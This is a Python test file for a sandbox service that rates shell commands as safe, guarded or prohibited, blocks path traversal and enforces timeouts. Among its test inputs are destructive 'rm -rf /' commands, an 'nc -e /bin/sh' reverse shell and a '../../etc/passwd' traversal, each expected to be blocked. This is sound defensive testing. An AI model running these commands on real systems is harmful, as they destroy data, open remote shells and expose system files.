"""Tests for safety sandbox policies and path containment."""
import pytest
import pathlib
from app.services.sandbox_service import SandboxService

def test_command_risk_classification():
    # Safe commands
    safe_res = SandboxService.analyze_command_risk("git status --short")
    assert safe_res["risk_level"] == "SAFE"
    assert safe_res["safe_to_execute"] is True

    safe_pytest = SandboxService.analyze_command_risk("pytest tests/ -v")
    assert safe_pytest["risk_level"] == "SAFE"
    assert safe_pytest["safe_to_execute"] is True

    # Guarded commands
    guarded_res = SandboxService.analyze_command_risk("npm install express")
    assert guarded_res["risk_level"] == "GUARDED"
    assert guarded_res["safe_to_execute"] is True
    assert len(guarded_res["flagged_patterns"]) > 0

    # Prohibited commands
    prohib_rm = SandboxService.analyze_command_risk("rm -rf / --no-preserve-root")
    assert prohib_rm["risk_level"] == "PROHIBITED"
    assert prohib_rm["safe_to_execute"] is False

    prohib_socket = SandboxService.analyze_command_risk("nc -e /bin/sh 192.168.1.5 8888")
    assert prohib_socket["risk_level"] == "PROHIBITED"
    assert prohib_socket["safe_to_execute"] is False

def test_path_containment_verification(tmp_path):
    ws_dir = tmp_path / "sandbox_workspace"
    ws_dir.mkdir()

    # Valid internal path
    ok, canon, msg = SandboxService.verify_path_containment(str(ws_dir), "src/main.py")
    assert ok is True
    assert "src/main.py" in canon

    # Path traversal breakout attempt
    traversal_ok, _, err = SandboxService.verify_path_containment(str(ws_dir), "../../etc/passwd")
    assert traversal_ok is False
    assert "traversal" in err.lower()

def test_execute_sandboxed_command_interception(tmp_path):
    ws_dir = tmp_path / "exec_workspace"
    ws_dir.mkdir()

    # Safe command executes
    exec_res = SandboxService.execute_sandboxed_command(str(ws_dir), "echo 'hello sandbox'")
    assert exec_res["exit_code"] == 0
    assert "hello sandbox" in exec_res["stdout"]

    # Prohibited command is intercepted before execution
    blocked = SandboxService.execute_sandboxed_command(str(ws_dir), "rm -rf /")
    assert blocked["exit_code"] == 126
    assert "SECURITY INTERCEPTION" in blocked["stderr"]
def test_execute_sandboxed_command_with_timeout(tmp_path):
    ws_dir = tmp_path / "timeout_workspace"
    ws_dir.mkdir()

    # Command that times out
    timeout_res = SandboxService.execute_sandboxed_command(str(ws_dir), "sleep 10", timeout_seconds=1)
    assert timeout_res["exit_code"] == 124
    assert "timed out" in timeout_res["stderr"].lower()

def test_execute_sandboxed_command_risk_assessment_included(tmp_path):
    ws_dir = tmp_path / "risk_workspace"
    ws_dir.mkdir()

    # Safe command includes risk assessment
    exec_res = SandboxService.execute_sandboxed_command(str(ws_dir), "echo test")
    assert "risk_assessment" in exec_res
    assert exec_res["risk_assessment"]["risk_level"] == "SAFE"
    assert exec_res["risk_assessment"]["safe_to_execute"] is True

    # Guarded command includes risk assessment
    guarded_res = SandboxService.execute_sandboxed_command(str(ws_dir), "npm install")
    assert "risk_assessment" in guarded_res
    assert guarded_res["risk_assessment"]["risk_level"] == "GUARDED"
    assert guarded_res["risk_assessment"]["safe_to_execute"] is True
    assert len(guarded_res["risk_assessment"]["flagged_patterns"]) > 0
